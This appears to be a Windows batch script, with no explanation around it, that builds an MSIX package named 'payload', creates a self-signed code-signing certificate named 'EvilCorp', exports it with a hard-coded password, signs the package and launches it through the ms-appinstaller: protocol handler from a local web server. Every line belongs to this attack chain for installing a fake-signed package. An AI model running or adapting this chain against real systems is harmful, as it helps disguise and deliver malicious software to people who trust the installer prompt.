"C:\Program Files (x86)\Windows Kits\10\App Certification Kit\makeappx.exe" pack /d C:\Temp\AppInstallerExploit\App /p C:\Temp\AppInstallerExploit\payload.msix /overwrite

powershell -Command Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -eq 'CN=EvilCorp'} | Remove-Item

powershell -Command New-SelfSignedCertificate -CertStoreLocation Cert:\CurrentUser\My -Subject 'CN=EvilCorp' -KeyExportPolicy Exportable -KeySpec Signature -NotAfter (Get-Date).AddYears(5) -FriendlyName 'AppInstallerFakeCert' -Type CodeSigningCert

powershell -Command $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -eq 'CN=EvilCorp'} | Sort-Object NotBefore -Descending | Select-Object -First 1; Export-PfxCertificate -Cert $cert -FilePath 'C:\Temp\AppInstallerExploit\cert.pfx' -Password (ConvertTo-SecureString -String 'pass123' -Force -AsPlainText)

"C:\Program Files (x86)\Windows Kits\10\App Certification Kit\signtool.exe" sign /fd SHA256 /a /f C:\Temp\AppInstallerExploit\cert.pfx /p pass123 C:\Temp\AppInstallerExploit\payload.msix

start ms-appinstaller:?source=http://127.0.0.1:8000/payload.appinstaller
